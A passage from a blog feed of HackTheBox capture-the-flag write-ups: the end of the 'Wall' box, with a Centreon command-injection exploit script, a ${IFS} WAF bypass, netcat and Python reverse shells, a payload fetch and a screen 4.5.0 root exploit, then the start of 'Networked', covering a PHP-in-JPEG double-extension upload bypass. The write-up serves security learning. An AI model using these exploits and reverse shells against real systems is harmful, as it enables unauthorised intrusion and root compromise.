token</span><br><span class="line">&#125;</span><br><span class="line">login_request = request.post(url+<span class="string">&quot;/index.php&quot;</span>, login_info)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Login token is : &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(token))</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;Your credentials are incorrect.&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> login_request.text:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Logged In&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Retrieving Poller token&quot;</span>)</span><br><span class="line"></span><br><span class="line">    poller_configuration_page = url + <span class="string">&quot;/main.get.php?p=60901&quot;</span></span><br><span class="line">    get_poller_token = request.get(poller_configuration_page)</span><br><span class="line">    poller_html = get_poller_token.text</span><br><span class="line">    poller_soup = BeautifulSoup(poller_html, features=<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    poller_token = poller_soup.findAll(<span class="string">&#x27;input&#x27;</span>)[<span class="number">25</span>].get(<span class="string">&quot;value&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Poller token is : &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(poller_token))</span><br><span class="line"></span><br><span class="line">    payload_info = &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Central66&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ns_ip_address&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;localhost[localhost]&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;is_default[is_default]&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;remote_id&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ssh_port&quot;</span>: <span class="string">&quot;22&quot;</span>,</span><br><span class="line">        <span class="string">&quot;init_script&quot;</span>: <span class="string">&quot;centengine&quot;</span>,</span><br><span class="line">        <span class="string">&quot;nagios_bin&quot;</span>: command,</span><br><span class="line">        <span class="string">&quot;nagiostats_bin&quot;</span>: <span class="string">&quot;/usr/sbin/centenginestats&quot;</span>,</span><br><span class="line">        <span class="string">&quot;nagios_perfdata&quot;</span>: <span class="string">&quot;/var/log/centreon-engine/service-perfdata&quot;</span>,</span><br><span class="line">        <span class="string">&quot;centreonbroker_cfg_path&quot;</span>: <span class="string">&quot;/etc/centreon-broker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;centreonbroker_module_path&quot;</span>: <span class="string">&quot;/usr/share/centreon/lib/centreon-broker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;centreonbroker_logs_path&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;centreonconnector_path&quot;</span>: <span class="string">&quot;/usr/lib64/centreon-connector&quot;</span>,</span><br><span class="line">        <span class="string">&quot;init_script_centreontrapd&quot;</span>: <span class="string">&quot;centreontrapd&quot;</span>,</span><br><span class="line">        <span class="string">&quot;snmp_trapd_path_conf&quot;</span>: <span class="string">&quot;/etc/snmp/centreon_traps/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ns_activate[ns_activate]&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;submitC&quot;</span>: <span class="string">&quot;Save&quot;</span>,</span><br><span class="line">        <span class="string">&quot;id&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;o&quot;</span>: <span class="string">&quot;c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;centreon_token&quot;</span>: poller_token,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    send_payload = request.post(poller_configuration_page, payload_info)</span><br><span class="line">    <span class="built_in">print</span>(send_payload.text)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Injecting Done.&quot;</span>)</span><br><span class="line">    generate_xml_page = url + <span class="string">&quot;/include/configuration/configGenerate/xml/generateFiles.php&quot;</span></span><br><span class="line">    xml_page_data = &#123;</span><br><span class="line">        <span class="string">&quot;poller&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;debug&quot;</span>: <span class="string">&quot;true&quot;</span>,</span><br><span class="line">        <span class="string">&quot;generate&quot;</span>: <span class="string">&quot;true&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    r = request.post(generate_xml_page, xml_page_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] Wrong credentials&quot;</span>)</span><br><span class="line">    exit()</span><br></pre></td></tr></table></figure><p>The exploit takes one argument which is the command we want to run. Let’s try to run a <code>netcat</code> reverse shell:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python exploit.py <span class="string">&quot;nc -e /bin/sh 10.0.0.1 8585&quot;</span></span><br><span class="line">[+] Retrieving CSRF token to submit the login form</span><br><span class="line">[+] Login token is : b4710792d09b371b03c9ef6d3bbf3f26</span><br><span class="line">[+] Logged In</span><br><span class="line">[+] Retrieving Poller token</span><br><span class="line">[+] Poller token is : c7f63cd8143107496edfdb8ac304b5ca</span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">&quot;-//IETF//DTD HTML 2.0//EN&quot;</span>&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line">&lt;title&gt;403 Forbidden&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Forbidden&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;You don<span class="string">&#x27;t have permission to access /centreon/main.get.php</span></span><br><span class="line"><span class="string">on this server.&lt;br /&gt;</span></span><br><span class="line"><span class="string">&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;hr&gt;</span></span><br><span class="line"><span class="string">&lt;address&gt;Apache/2.4.29 (Ubuntu) Server at wall.htb Port 80&lt;/address&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Injecting Done.</span></span><br></pre></td></tr></table></figure><p>Hum, we get stuck with <code>Forbidden</code>.</p><p>Seems like a WAF (web application firewall) is in place (probably the why the box name is <code>Wall</code>). When we send a simple test command, like <code>test</code> the injection succeed. Let’s try to send a few special char we had in our netcat command to find which one exactly is filtered :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python exploit.py <span class="string">&quot;-/,.&quot;</span></span><br><span class="line">[+] Retrieving CSRF token to submit the login form</span><br><span class="line">[+] Login token is : b4710792d09b371b03c9ef6d3bbf3f26</span><br><span class="line">[+] Logged In</span><br><span class="line">[+] Retrieving Poller token</span><br><span class="line">[+] Poller token is : c7f63cd8143107496edfdb8ac304b5ca</span><br><span class="line">[+] Injecting Done.</span><br></pre></td></tr></table></figure><p>No blocking this time… So what remains ? The space of course…. Let’s give it a try:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python exploit.py <span class="string">&quot;test test&quot;</span></span><br><span class="line">[+] Retrieving CSRF token to submit the login form</span><br><span class="line">[+] Login token is : b4710792d09b371b03c9ef6d3bbf3f26</span><br><span class="line">[+] Logged In</span><br><span class="line">[+] Retrieving Poller token</span><br><span class="line">[+] Poller token is : c7f63cd8143107496edfdb8ac304b5ca</span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">&quot;-//IETF//DTD HTML 2.0//EN&quot;</span>&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line">&lt;title&gt;403 Forbidden&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Forbidden&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;You don<span class="string">&#x27;t have permission to access /centreon/main.get.php</span></span><br><span class="line"><span class="string">on this server.&lt;br /&gt;</span></span><br><span class="line"><span class="string">&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;hr&gt;</span></span><br><span class="line"><span class="string">&lt;address&gt;Apache/2.4.29 (Ubuntu) Server at wall.htb Port 80&lt;/address&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Injecting Done.</span></span><br></pre></td></tr></table></figure><p>So now we have to find a solution to use command without spaces… Searching a bit online we find that it’s possible to use the <a href="https://en.wikipedia.org/wiki/Internal_field_separator">Internal field separator</a> :</p><blockquote><p>The shell treats each character of $IFS as a delimiter, and splits the results of the other expansions into words on these characters.</p></blockquote><p>Let’s give it try:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span><span class="variable">$IFStest</span></span><br><span class="line">[hg8@archbook ~]$ </span><br></pre></td></tr></table></figure><p>Unfortunately this doesn’t seems to work but using the brackets works!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span><span class="variable">$&#123;IFS&#125;</span><span class="built_in">test</span></span><br><span class="line"><span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>Let’s try edit our exploit to replace spaces with the IFS:</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[...]</span><br><span class="line">command = sys.argv[1]</span><br><span class="line"><span class="addition">+ command = command.replace(&#x27; &#x27;, &#x27;$&#123;IFS&#125;&#x27;)</span></span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>This time we are going to open a local web server to have feedback on wether our command injection worked on not. In a new terminal let’s open a python simple http server:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure><p>And let’s run our exploit again:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python exploit.py <span class="string">&quot;wget 10.10.10.10:8000/hg8.py -O /tmp/hg8.py&quot;</span></span><br><span class="line">[+] Retrieving CSRF token to submit the login form</span><br><span class="line">[+] Login token is : 56855cc04ceb87148ce7d83c4b90bd9e</span><br><span class="line">[+] Logged In</span><br><span class="line">[+] Retrieving Poller token</span><br><span class="line">[+] Poller token is : 7b642628745280f86fc6100f43fd7ad9</span><br><span class="line">[+] Injecting Done.</span><br></pre></td></tr></table></figure><p>And on our web server we see a new entry:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line">10.10.10.10 - - [29/Oct/2019 13:29:27] <span class="string">&quot;GET /hg8.py HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure><p>The <code>hg8.py</code> countains a python reverse shell:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;10.0.0.1&quot;</span>,<span class="number">8585</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>); os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);</span><br></pre></td></tr></table></figure><p>Since we managed to write it to the server, let’s run it now. We first open our <code>nc</code> listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure><p>And run the exploit again :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python exploit.py <span class="string">&quot;python /tmp/hg8.py&quot;</span></span><br><span class="line">[+] Retrieving CSRF token to submit the login form</span><br><span class="line">[+] Login token is : b4710792d09b371b03c9ef6d3bbf3f26</span><br><span class="line">[+] Logged In</span><br><span class="line">[+] Retrieving Poller token</span><br><span class="line">[+] Poller token is : c7f63cd8143107496edfdb8ac304b5ca</span><br><span class="line">[+] Injecting Done.</span><br></pre></td></tr></table></figure><p>And the shell open in our reverse shell:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.157:50472</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data),6000(centreon)</span></span><br></pre></td></tr></table></figure><p>We got our first shell. Time to move onto the user flag.</p><p>Let’s enumerate what we have here :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ ls -l /home</span><br><span class="line">total 8</span><br><span class="line">drwxr-xr-x 6 shelby     shelby     4096 Jul 30 17:37 shelby</span><br><span class="line">drwxr-xr-x 5 sysmonitor sysmonitor 4096 Jul  6 15:07 sysmonitor</span><br><span class="line">$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">[...]</span><br><span class="line">/bin/screen-4.5.0</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>Interresting, I always run a search for binaries with setuid bit enabled first and this returned <code>screen</code> in version 4.5.0.</p><p>As a reminder :</p><blockquote><p>Binaries with the setuid bit enabled, are being executed as if they were running under the context of the root user. This enables normal (non-privileged) users to use special privileges, like opening sockets. While this seems unnecessary for a normal user, it is actually needed for simple commands like ping.</p></blockquote><p>After a bit of search we stumbled upon a <a href="https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html">bug</a> that allows to privilege escalte to root with <code>screen</code> 4.5.0 and setuid bit set.<br>Let’s give it a try !</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ wget https://raw.githubusercontent.com/XiphosResearch/exploits/master/screen2root/screenroot.sh</span><br><span class="line">2019-10-29 14:59:15 (4.83 MB/s) - ‘screenroot.sh’ saved [1152/1152]</span><br><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line"></span><br><span class="line">www-data@Wall:/tmp$ wget 10.0.0.1:8000/screenroot.sh</span><br><span class="line">2019-10-29 14:59:58 (8.32 MB/s) - ‘screenroot.sh’ saved [1152/1152]</span><br><span class="line">www-data@Wall:/tmp$ bash screenroot.sh</span><br><span class="line">~ gnu/screenroot ~</span><br><span class="line">[+] First, we create our shell and library...</span><br><span class="line">[+] Now we create our /etc/ld.so.preload file...</span><br><span class="line">[+] Triggering...</span><br><span class="line"><span class="string">&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.</span></span><br><span class="line"><span class="string">[+] done!</span></span><br><span class="line"><span class="string">No Sockets found in /tmp/screens/S-www-data.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root),33(www-data),6000(centreon)</span></span><br></pre></td></tr></table></figure><p>We got our root shell !</p><p>We skipped the pivot to user part (if there was any) but we can now access easily to both flags:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat /home/shelby/user.txt</span></span><br><span class="line">fe6194544f45xxxxx5b12f8da8406</span><br><span class="line"><span class="comment"># cat /root/root.txt</span></span><br><span class="line">1fdbcf8c33exxxxxx2e1b4d5db7</span><br></pre></td></tr></table></figure><p>Later I will give this box another try to pivot correctly to the <code>shelby</code> user if it’s possible and update this writeup.</p><p>EDIT: Here how the pivot was possible : <a href="https://0xdf.gitlab.io/2019/12/07/htb-wall.html#priv-www-data--shelby">https://0xdf.gitlab.io/2019/12/07/htb-wall.html#priv-www-data--shelby</a></p><p>As always do not hesitate to contact me for any questions or feedbacks.</p><p>See you next time !</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Medium Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> gobuster </tag>
            
            <tag> waf </tag>
            
            <tag> wall </tag>
            
            <tag> wfuzz </tag>
            
            <tag> centreon </tag>
            
            <tag> cve-2019-13024 </tag>
            
            <tag> filter </tag>
            
            <tag> screen </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Networked</title>
      <link href="/posts/networked/"/>
      <url>/posts/networked/</url>
      
        <content type="html"><![CDATA[<img width="582" alt="networked-hackthebox" src="https://user-images.githubusercontent.com/9076747/82158153-62de5900-9886-11ea-8693-ec973771004c.png"><p>Networked was an interesting box. Focused on coding mistakes rather than exploit or misconfiguration.</p><p>First thing first, let’s add the box IP to the hosts file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.146 networked.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>Let’s go !</p><h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC networked.htb</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-19 19:47 CEST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> networked.htb (10.10.10.146)</span><br><span class="line">PORT    STATE  SERVICE VERSION</span><br><span class="line">22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)</span><br><span class="line">|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16</span><br><span class="line">443/tcp closed https</span><br></pre></td></tr></table></figure><p>Seems like we have something super classical: A http (port 80) and SSH (port 22) service open.</p><p>Opening <a href="http://networked.htb/">http://networked.htb</a> display the following message :</p><blockquote><p>Hello mate, we’re building the new FaceMash!<br>Help by funding us and be the new Tyler&amp;Cameron!<br>Join us at the pool party this Sat to get a glimpse</p></blockquote><p>No useful informations in this message. Let’s continue our recon phase with a HTTP enumeration.</p><p>As usual use <code>gobuster</code>. I add the <code>-x php</code> parameter to make sure we get all files with this extension :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u http://networked.htb -w ~/SecLists/Discovery/Web-Content/big.txt -x php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">/.htaccess (Status: 403)</span><br><span class="line">/.htaccess.php (Status: 403)</span><br><span class="line">/.htpasswd (Status: 403)</span><br><span class="line">/.htpasswd.php (Status: 403)</span><br><span class="line">/backup (Status: 301)</span><br><span class="line">/cgi-bin/ (Status: 403)</span><br><span class="line">/index.php (Status: 200)</span><br><span class="line">/lib.php (Status: 200)</span><br><span class="line">/photos.php (Status: 200)</span><br><span class="line">/upload.php (Status: 200)</span><br><span class="line">/uploads (Status: 301)</span><br></pre></td></tr></table></figure><p>The <code>/backup</code> endpoint is promising. Once opening it we find an archive :</p><p><img src="https://user-images.githubusercontent.com/9076747/67149664-317cbb00-f2ae-11e9-961d-579ad1cdd818.png" alt="Networked backup page"></p><p>Let’s download it and check what’s inside:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ wget http://networked.htb/backup/backup.tar</span><br><span class="line">2019-10-19 19:57:46 (65.6 MB/s) - <span class="string">&#x27;backup.tar&#x27;</span> saved [10240/10240]</span><br><span class="line">[hg8@archbook ~]$ tar -xvf backup.tar</span><br><span class="line">index.php</span><br><span class="line">lib.php</span><br><span class="line">photos.php</span><br><span class="line">upload.php</span><br></pre></td></tr></table></figure><p>It’s a backup of the website. Seems like <code>gobuster</code> did a good job since it already found each of those files.</p><p>Upon investigating the file we find that <code>upload.php</code> is …well… a upload page. It accepts only image and part of the code that check the validity of the sent file is written in <code>lib.php</code> alongside various functions.</p><p><code>photos.php</code> is used to display uploaded images.</p><p>First thing that come to mind here is to try to upload a php webshell through the <code>upload.php</code> page. Let’s check the rules that validate if a file is valid or not :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!(check_file_type(<span class="variable">$_FILES</span>[<span class="string">&quot;myFile&quot;</span>]) &amp;&amp; filesize(<span class="variable">$_FILES</span>[<span class="string">&#x27;myFile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]) &lt; <span class="number">60000</span>)) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Invalid image file.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_file_type</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$mime_type</span> = file_mime_type(<span class="variable">$file</span>);</span><br><span class="line">  <span class="keyword">if</span> (strpos(<span class="variable">$mime_type</span>, <span class="string">&#x27;image/&#x27;</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The first check consist in a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types">MIME type</a> check of the file. If the file MIME type doesn’t contain <code>image/</code> it will be defined as invalid.</p><p>This check means that the image will be validated locally, so no request edition will help to smuggle a PHP Shell (by editing <code>Content-Type</code> header for example).</p><p>Scrolling through the code we notice a second check :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$validext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.jpg&#x27;</span>, <span class="string">&#x27;.png&#x27;</span>, <span class="string">&#x27;.gif&#x27;</span>, <span class="string">&#x27;.jpeg&#x27;</span>);</span><br><span class="line"><span class="variable">$valid</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$validext</span> <span class="keyword">as</span> <span class="variable">$vext</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (substr_compare(<span class="variable">$myFile</span>[<span class="string">&quot;name&quot;</span>], <span class="variable">$vext</span>, -strlen(<span class="variable">$vext</span>)) === <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="variable">$valid</span> = <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This one check do compare the end of the filename to see if it end with the common <code>.jpg</code>, <code>.png</code>, <code>.gif</code> and <code>.jpeg</code>. If not, the file is defined invalid and not uploaded.</p><p>Alright, with all those information in mind let’s try to craft one malicious image :)</p><h3 id="File-upload-vulnerability"><a href="#File-upload-vulnerability" class="headerlink" title="File upload vulnerability"></a>File upload vulnerability</h3><h4 id="Bypass-First-Check-MIME-Type"><a href="#Bypass-First-Check-MIME-Type" class="headerlink" title="Bypass First Check: MIME Type"></a>Bypass First Check: MIME Type</h4><p>The easiest way to do so is to take a valid image and append the malicious content at the end of the file. It can be done in various way. Here how I did:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="comment"># Download most basic jpg image possible</span></span><br><span class="line">[hg8@archbook ~]$ wget https://raw.githubusercontent.com/mathiasbynens/small/master/jpeg.jpg -O hg8.jpeg</span><br><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span> &gt;&gt; hg8.jpeg</span><br><span class="line">[hg8@archbook ~]$ cat hg82.jpeg</span><br><span class="line">����C</span><br><span class="line">��</span><br><span class="line"> ���?�� ��&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure><h4 id="Bypass-Second-Check-File-extension"><a href="#Bypass-Second-Check-File-extension" class="headerlink" title="Bypass Second Check: File extension**"></a>Bypass Second Check: File extension**</h4><p>A common vulnerability in php file upload form is the “double extension” :</p><blockquote><p>In Apache, a php file might be executed using the double extension technique such as “file.php.jpg.<br><a href="https://www.owasp.org/index.php/Unrestricted_File_Upload">Unrestricted File Upload</a></p></blockquote><p>And that’s exactly what we are going to do. The second check will pass because our file extension will be <code>.jpg</code> but the php code inside will still get executed:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 